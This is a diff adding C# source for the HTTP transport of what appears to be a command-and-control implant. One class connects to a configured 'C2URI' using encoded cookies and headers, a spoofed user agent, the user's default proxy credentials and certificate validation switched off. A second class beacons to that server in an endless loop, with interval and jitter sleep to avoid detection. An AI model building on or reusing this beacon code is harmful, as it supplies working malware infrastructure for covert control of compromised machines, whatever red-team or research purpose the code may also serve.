@@ -1,0 +1,131 @@
+    public class HttpClient
+    {
+        public HttpWebRequest client { get; set; }
+
+        public HttpWebRequest GetClient()
+        {
+            return client;
+        }
+
+        public HttpClient(dynamic configuration)
+        {
+            //set the C2 URI
+            Uri uri = new Uri(configuration.C2URI);
+
+            //create a cookie container 
+            CookieContainer cookies = new CookieContainer();
+
+            //add cookies to the container
+            string Cookies_json = Encoding.UTF8.GetString(Convert.FromBase64String(configuration.COOKIES));
+            Dictionary<string, string> Cookies = JsonSerializer.Deserialize<Dictionary<string, string>>(Cookies_json);
+            foreach (var c in Cookies)
+            {
+                cookies.Add(new Cookie(c.Key, c.Value) { Domain = uri.Host });
+            }
+
+            //create the HTTP request
+            client = WebRequest.Create(uri) as HttpWebRequest;
+
+            //assign the cookies to the request
+            client.CookieContainer = cookies;
+
+            // set the method 
+            client.Method = configuration.REQUESTMETHOD;
+
+            // set the content for POST
+            if (client.Method == "POST")
+            {
+                Stream clientstream = client.GetRequestStream();
+                byte[] postbuffer = Encoding.UTF8.GetBytes(configuration.REQUEST);
+                client.ContentType = "text/html; charset=UTF-8";
+                client.Accept = "*/*";
+                client.ContentLength = postbuffer.Length;
+                clientstream.Write(postbuffer, 0, postbuffer.Length);
+            }
+
+            // no redirects
+            client.AllowAutoRedirect = false;
+
+            //add headers 
+            string Headers_json = Encoding.UTF8.GetString(Convert.FromBase64String(configuration.HTTPHEADERS));
+            Dictionary<string, string> Headers = JsonSerializer.Deserialize<Dictionary<string, string>>(Headers_json);
+            foreach (var h in Headers)
+            {
+                client.Headers.Add(h.Key, h.Value);
+            }
+
+            //proxy settings
+            // get the default proxy if there is
+            client.Proxy = new System.Net.WebProxy();
+            // get the credentials for the proxy if there is
+            client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
+
+            //ignore certificate issues
+            client.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
+
+            // accept anything
+            client.Accept = "*/*";
+
+            //set the user agent in configuraton
+            if (configuration.HTTPUA != null)
+            {
+                client.UserAgent = configuration.HTTPUA;
+            }
+
+        }
+    }
+
+    public class HttpSocket
+    {
+        public Configuration configuration;
+
+        public HttpSocket(dynamic configuration)
+        {
+            this.configuration = configuration;            
+        }
+
+        public string GetURI()
+        {
+            return configuration.C2URI;
+        }
+
+
+        public void Start()
+        {
+            Console.WriteLine("Connecting to {0}", configuration.C2URI);
+
+            // sleep calculation
+            Int32 i = Int32.Parse(configuration.INTERVAL);
+            Int32 j = Int32.Parse(configuration.JITTER);
+            Int32 SleepTimer = (i - i * j / 100) * 1000;
+
+            while (true)
+            {
+                try
+                {
+                    // creating a new HTTP client
+                    HttpClient cclass = new HttpClient(configuration);
+                    HttpWebRequest client = cclass.GetClient();
+
+                    // get the response
+                    WebResponse response = client.GetResponse();
+                    StreamReader streamReader = new StreamReader(response.GetResponseStream(), true);
+
+                    // dump the response body
+                    string responsebody = string.Empty;
+                    responsebody = streamReader.ReadToEnd();
+                    streamReader.Close();
+                    Console.WriteLine("Server response body:\n{0}", responsebody);
+
+                    // sleep 
+                    Thread.Sleep(SleepTimer);
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine("Failed to get HTTP response: {0}", e);
+                }
+
+            }
+        }
+
+    }
